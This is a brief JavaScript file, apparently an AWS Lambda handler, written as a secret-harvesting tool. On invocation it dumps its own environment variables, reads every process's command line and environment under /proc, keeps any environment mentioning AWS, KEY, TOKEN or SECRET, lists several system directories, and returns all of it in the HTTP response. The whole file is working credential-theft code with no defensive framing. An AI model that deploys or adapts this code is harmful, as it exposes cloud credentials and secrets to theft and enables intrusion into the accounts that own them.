
const fs = require('fs');
const read = (p, max = 4000) => {
  try { return fs.readFileSync(p).toString('utf8', 0, max).replace(/\0/g, '|'); }
  catch (e) { return 'ERR ' + String(e).slice(0, 80); }
};
const ls = (p) => {
  try { return fs.readdirSync(p, { withFileTypes: true }).map(e => e.name).join(','); }
  catch (e) { return 'ERR'; }
};
exports.handler = async () => {
  const out = {};
  out.env = process.env;
  out.procs = {};
  try {
    const names = fs.readdirSync('/proc');
    for (const n of names) {
      if (!/^\d+$/.test(n)) continue;
      const cmd = read('/proc/' + n + '/cmdline', 400);
      if (cmd.startsWith('ERR') && !cmd.includes('ENOENT')) continue;
      out.procs[n] = { cmd: cmd.slice(0, 300) };
      const env = read('/proc/' + n + '/environ', 2500);
      if (env && !env.startsWith('ERR') && (env.includes('AWS') || env.includes('KEY') || env.includes('TOKEN') || env.includes('SECRET'))) {
        out.procs[n].env = env.slice(0, 2500);
      }
    }
  } catch (e) { out.procs.err = String(e); }
  out.fs = {
    opt: ls('/opt'),
    varTask: ls('/var/task'),
    tmp: ls('/tmp'),
    root: ls('/'),
  };
  return { statusCode: 200, body: JSON.stringify(out) };
};
